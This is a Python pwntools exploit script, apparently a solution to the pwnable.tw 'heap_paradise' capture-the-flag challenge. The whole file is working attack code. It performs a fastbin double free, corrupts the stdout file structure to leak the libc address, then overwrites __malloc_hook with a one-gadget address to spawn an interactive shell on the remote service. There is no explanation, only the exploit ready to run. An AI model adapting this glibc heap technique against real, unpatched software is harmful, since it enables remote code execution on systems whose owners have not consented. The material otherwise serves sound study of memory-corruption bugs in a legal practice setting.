from pwn import *

BEDUG = True

if BEDUG == False:
    io = process('./heap_paradise_patched')
    #gdb.attach(io)
    libc = ELF('./libc.so.6')
else:
    io = remote('chall.pwnable.tw', 10308)
    libc = ELF('./libc_64.so.6')

def add(size, content):
    io.sendlineafter(b'You Choice:', b'1')
    io.sendlineafter(b'Size :', str(size).encode('utf-8'))
    io.sendafter(b'Data :', content)

def rm(index):
    io.sendlineafter(b'You Choice:', b'2')
    io.sendlineafter(b'Index :', str(index).encode('utf-8'))

add(0x38, p64(0)*3+p64(0x41)) #0
add(0x68, p64(0)*3+p64(0x41)) #1
add(0x38, p64(0)*3+p64(0x21)) #2
rm(1)
rm(0)
rm(2)
rm(0)
add(0x38, b'\x20') #3
add(0x38, b'A') #4
add(0x38, b'A') #5
add(0x38, p64(0)*3+p64(0x91)) #6
rm(1)
add(0x18, p16(0x35dd)) #7
rm(6)
add(0x38, p64(0)*3+p64(0x71)) #8
add(0x68, b'\0') #9
stdout_edit = b'\0'*0x33 + p64(0xfbad3887) + p64(0)*3 + b'\0'
try:
    add(0x68, stdout_edit) #10
except:
    log.info('Seems like today\'s not your lucky day...')
    exit(1)
io.recv(72)
leak = io.recv(6)
if (leak == b' 1. Al'):
    log.info('Failed! Try again...')
    exit(1)
libc.address = u64(leak+b'\0\0') - 0x3c46a3
log.info('Libc: '+hex(libc.address))
log.info('!!!')
rm(7)
rm(6)
add(0x38, p64(0)*3+p64(0x71)+p64(libc.sym['__malloc_hook'] - 35)) #11
add(0x68, b'\0') #12
add(0x68, b'\0'*19+p64(libc.address+0xef6c4)) #13
rm(0)
rm(0)
io.interactive()
